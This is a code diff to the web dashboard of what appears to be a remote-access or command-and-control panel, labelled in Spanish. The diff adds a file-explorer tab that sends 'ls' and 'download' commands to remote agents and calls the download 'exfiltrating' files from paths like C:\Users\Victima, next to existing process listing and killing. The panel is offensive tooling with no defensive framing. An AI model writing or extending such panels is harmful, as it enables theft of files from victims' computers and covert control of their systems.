@@ -33,15 +33,15 @@
 
         /* Tabs Styling */
         .nav-tabs { border-bottom: 1px solid #1a1f29; }
-        .nav-tabs .nav-link { 
-            color: var(--neon-blue) !important; 
+        .nav-tabs .nav-link {
+            color: var(--neon-blue) !important;
             border: none !important;
             border-bottom: 2px solid transparent !important;
             transition: 0.3s;
         }
-        .nav-tabs .nav-link.active { 
-            background: transparent !important; 
-            border-bottom: 2px solid var(--neon-blue) !important; 
+        .nav-tabs .nav-link.active {
+            background: transparent !important;
+            border-bottom: 2px solid var(--neon-blue) !important;
             font-weight: bold;
             text-shadow: 0 0 8px var(--neon-blue);
         }
@@ -131,6 +131,11 @@
                     <i class="fas fa-cogs"></i> SYSTEM TOOLS
                 </button>
             </li>
+            <li class="nav-item">
+                <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files-view" type="button">
+                    <i class="fas fa-folder-open"></i> FILE EXPLORER
+                </button>
+            </li>
         </ul>
 
         <div class="tab-content">
@@ -160,7 +165,7 @@
                             <div class="card-body">
                                 <label class="small mb-1">ID del Agente Target:</label>
                                 <input type="number" id="target-id" class="form-control mb-3" placeholder="Ej: 0">
-                                
+
                                 <button class="btn btn-info w-100 mb-3" onclick="pedirProcesos()">
                                     <i class="fas fa-list"></i> LISTAR PROCESOS (ps)
                                 </button>
@@ -179,7 +184,39 @@
                         <div class="card bg-dark border-info text-info">
                             <div class="card-header border-info bg-transparent">📋 Lista de Procesos del Sistema</div>
                             <div class="card-body p-0">
-                                <pre id="process-output" class="respuesta-text m-0" style="max-height: 450px; height: 450px; color: var(--neon-green); border:none;">Selecciona un agente y dale a "Listar Procesos"...</pre>
+                                <pre id="process-output" class="respuesta-text m-0" style="max-height: 450px; height: 450px; color: var(--neon-green); border:none;">Selecciona un ID y dale a "Listar Procesos"...</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-pane fade" id="files-view" role="tabpanel">
+                <div class="row">
+                    <div class="col-md-12">
+                        <div class="card bg-dark border-info text-info">
+                            <div class="card-header border-info bg-transparent d-flex justify-content-between align-items-center">
+                                <span>📂 Explorador de Archivos Remoto</span>
+                                <div class="d-flex w-50">
+                                    <input type="text" id="current-path" class="form-control form-control-sm me-2" value="C:\\">
+                                    <button class="btn btn-sm btn-info" onclick="explorarRuta()">
+                                        <i class="fas fa-search"></i> EXPLORAR
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="card-body p-0">
+                                <pre id="file-output" class="respuesta-text m-0" style="max-height: 400px; height: 400px; color: var(--neon-green); border:none;">Indica la ruta y pulsa Explorar...</pre>
+                                
+                                <div class="p-3 border-top border-secondary bg-black">
+                                    <label class="small text-info mb-1"><i class="fas fa-file-download"></i> EXFILTRAR ARCHIVO (Download)</label>
+                                    <div class="input-group">
+                                        <input type="text" id="file-to-download" class="form-control" placeholder="Ruta completa: C:\\Users\\Victima\\Documents\\secreto.txt">
+                                        <button class="btn btn-info" onclick="descargarArchivo()">
+                                            <i class="fas fa-download"></i> DESCARGAR
+                                        </button>
+                                    </div>
+                                    <small class="text-muted mt-1 d-block">Los archivos se guardarán en la carpeta 'downloads' del servidor.</small>
+                                </div>
                             </div>
                         </div>
                     </div>
@@ -285,11 +322,11 @@
         await fetch('/ejecutar', { method: 'POST', body: formData });
     }
 
-    // --- PACK HERRAMIENTAS: PROCESOS ---
+    // --- SYSTEM TOOLS: PROCESOS ---
     async function pedirProcesos() {
         const id = document.getElementById('target-id').value;
-        if(!id) return alert("Ingresa el ID del agente");
-        
+        if(!id) return alert("Ingresa el ID del agente en la pestaña System Tools");
+
         const formData = new FormData();
         formData.append('id', id);
         formData.append('comando', 'ps');
@@ -298,7 +335,6 @@
 
         try {
             await fetch('/ejecutar', { method: 'POST', body: formData });
-            // Esperamos un segundo a que el agente procese y actualizamos
             setTimeout(async () => {
                 const res = await fetch('/api/agentes');
                 const agentes = await res.json();
@@ -318,6 +354,47 @@
         formData.append('comando', `kill ${pid}`);
         await fetch('/ejecutar', { method: 'POST', body: formData });
         alert("Orden de terminación enviada.");
+    }
+
+    // --- FILE EXPLORER: NAVEGACIÓN ---
+    async function explorarRuta() {
+        const id = document.getElementById('target-id').value;
+        const ruta = document.getElementById('current-path').value;
+        if(!id) return alert("Primero indica el ID del agente en la pestaña SYSTEM TOOLS");
+
+        const formData = new FormData();
+        formData.append('id', id);
+        formData.append('comando', `ls ${ruta}`);
+
+        document.getElementById('file-output').innerText = "Explorando directorio remoto...";
+
+        try {
+            await fetch('/ejecutar', { method: 'POST', body: formData });
+            setTimeout(async () => {
+                const res = await fetch('/api/agentes');
+                const agentes = await res.json();
+                const agente = agentes.find(a => a.id == id);
+                document.getElementById('file-output').innerText = agente.resultado;
+            }, 1500);
+        } catch (e) { console.error(e); }
+    }
+
+    // --- FILE EXPLORER: DESCARGA DE ARCHIVOS ---
+    async function descargarArchivo() {
+        const id = document.getElementById('target-id').value;
+        const ruta = document.getElementById('file-to-download').value;
+        
+        if(!id || !ruta) return alert("Indica el ID del agente (en System Tools) y la ruta completa del archivo.");
+
+        const formData = new FormData();
+        formData.append('id', id);
+        formData.append('comando', `download ${ruta}`);
+
+        alert("Petición de exfiltración enviada. El archivo se procesará en el servidor.");
+
+        try {
+            await fetch('/ejecutar', { method: 'POST', body: formData });
+        } catch (e) { console.error("Error en descarga:", e); }
     }
 
     setInterval(actualizarAgentes, 3000);
